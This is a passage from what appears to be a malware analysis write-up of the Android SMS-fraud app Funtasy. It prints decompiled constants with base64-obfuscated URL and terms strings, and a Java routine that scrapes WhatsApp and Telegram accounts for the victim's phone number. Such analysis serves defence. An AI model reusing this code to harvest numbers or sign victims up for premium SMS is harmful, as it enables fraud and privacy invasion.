class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"com.handcent.nextsms"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">HANGOUTS</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"com.google.android.talk"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">JAZZTEL_OPERATOR</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"JAZZTEL"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">JAZZTEL_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21421"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">MIO_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"50503"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">MOVISTAR_OPERATOR</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"MOVISTAR"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">MOVISTAR_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21407"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">MOVISTAR_OPERATOR_CODE_PHP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"364"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">ONO_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21418"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">ORANGE_OPERATOR</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"ORANGE"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">ORANGE_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21403"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">ORANGE_OPERATOR_CODE_PHP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"363"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">ORIGIN_SMS</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Nzk3OTc3"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">PEPEPHONE_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21406"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">R_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21417"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">R_OPERATOR_CODE_PHP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"368"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">SECRET_FILE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"configuration_2"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">SIMYO_OPERATOR</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SIMYO"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">SIMYO_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21419"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">SIMYO_OPERATOR_CODE_PHP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"367"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">SPAIN_COUNTRY_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"214"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">TELECABLE_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21416"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">TELECABLE_OPERATOR_CODE_PHP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"369"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">TELEGRAM1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"org.telegram.messenger.account"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">TELEGRAM2</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"org.telegram.account"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">TERMS</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"U2VydmljaW8gZGUgc3VzY3JpcGNpw7NuIHBhcmEgdXN1YXJpb3MgTW92aXN0YXIsIFZvZGFmb25lLCBPcmFuZ2UsIFlvaWdvLCBSIHkgU2lteW8gcGFyYSBtYXlvcmVzIGRlIGVkYWQgbyBtZW5vcmVzIGNvbiBjYXBhY2lkYWQgbGVnYWwgcGFyYSBjb250cmF0YXIsIHByZXN0YWRvcyBwb3IgKEZVTlRBU1kgTU9CSUxFIFMuTC4sIG9wZXJhZG9yIHRpdHVsYXIgQVJHQVRFTCBTT0xVVElPTlMgU0wsIG4uIGF0ZW5jacOzbiBhbCBjbGllbnRlIDkwMiAzMDMgODAzIMOzIGluZkBhcmdhdGVsLmNvbSwgYXBhcnRhZG8gZGUgY29ycmVvcyAxNjcsIDE3MDAxIEdpcm9uYS4gQ29zdGUgcG9yIFNNUyByZWNpYmlkbyAxLjQ2IGV1cm9zL3NtcyAoSVZBIGluY2x1aWRvKSBtw6FzIGVsIGNvc3RlIGRlIG5hdmVnYWNpw7NuIFdBUCwgcXVlIGRlcGVuZGVyw6EgZGVsIG9wZXJhZG9yIHF1ZSB0ZW5nYSBjb250cmF0YWRvLiBNw6F4aW1vIDEwIHNtcy9zZW1hbmEuIEVsIGzDrW1pdGUgbcOheGltbyBkZSBmYWN0dXJhY2nDs24gZGVsIHNlcnZpY2lvIHB1ZWRlIHZhcmlhciBlbiBmdW5jacOzbiBkZSB0dSBvcGVyYWRvciAoMTggYSAzMCBldXJvcy9tZXMpLiBCYWphIGF1dG9tw6F0aWNhIHBhcmEgY2FuY2VsYXIgZWwgc2VydmljaW86IGVudsOtYSBCQUpBIGFsIDc5Nzk3Ny4="</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">TEXTSECURE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"org.thoughtcrime.securesms"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">URL</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">VODAFONE_OPERATOR</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"VODAFONE ES"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">VODAFONE_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21401"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">VODAFONE_OPERATOR_CODE_PHP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"365"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">WHATSAPP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"com.whatsapp"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">YOIGO_OPERATOR</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"YOIGO"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">YOIGO_OPERATOR_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"21404"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">YOIGO_OPERATOR_CODE_PHP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"55"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-41">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-e">Constants</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">super</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-45"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0037 seconds] -->
<p>After determining the phone is on one of the correct networks, the malware searches for the phone’s mobile number. It does this in three ways:</p>
<ul>
<li>Invoking the TelephonyManager’s getLine1Number() method.</li>
<li>Traversing the phones call logs and parsing the phones outgoing number.</li>
<li>Searching the phone for account numbers associated with messaging apps WhatsApp and Telegram.  If a user has registered with one of these applications using a number not associated with the phone, that number will be used by Funtasy.</li>
</ul>
<p><em>Util.java</em></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694b98e2cf7943201463" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
private static String getPhoneNumberFromAccounts(Context context) throws Exception {
        String v2;
        int v8;
        Account[] v1;
        Log.i("Util", "begin method getPhoneNumberFromAccounts");
        String v7 = null;
        try {
            v1 = AccountManager.get(context).getAccounts();
            String v5 = "telegram";
            int v9 = v1.length;
            v8 = 0;
        }
        catch(Exception v6) {
            goto label_46;
        }

        while(true) {
            if(v8 &gt;= v9) {
                goto label_10;
            }

            try {
                Account v0 = v1[v8];
                v2 = v0.name;
                String v3 = v0.type;
                if(!v3.equals("com.whatsapp")) {
                    if(!v3.equals("org.telegram.messenger.account") &amp;&amp; !v3.equals("org.telegram.account")
                             &amp;&amp; !v3.contains(((CharSequence)v5))) {
                        goto label_37;
                    }

                    break;
                }
                else if(!v2.equals("WhatsApp") &amp;&amp; (Util.isANumber(v2))) {
                    v7 = Util.formatPhoneNumber(v2);
                    goto label_10;
                }
            }
            catch(Exception v6) {
                goto label_46;
            }

        label_37:
            ++v8;
        }

        try {
            v7 = Util.formatPhoneNumber(v2);
        }
        catch(Exception v6) {
        label_46:
            Log.e("Util", "error method getPhoneNumberFromAccounts: " + v6.getMessage());
            v6.printStackTrace();
        }

    label_10:
        Log.i("Util", "end method getPhoneNumberFromAccounts");
        return v7;
    }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-2">2</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-4">4</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-6">6</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-8">8</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-10">10</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-12">12</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-14">14</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-16">16</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-18">18</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-20">20</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-22">22</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-24">24</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-26">26</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-28">28</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-30">30</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-32">32</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-34">34</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-36">36</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-38">38</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-40">40</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-42">42</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-44">44</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-46">46</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-48">48</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-50">50</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-52">52</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-54">54</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-56">56</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cf7943201463-58">58</div><div class="crayon-num" data-line="crayon-5f694b98e2cf7943201463-59">59</div></div>
				</td>
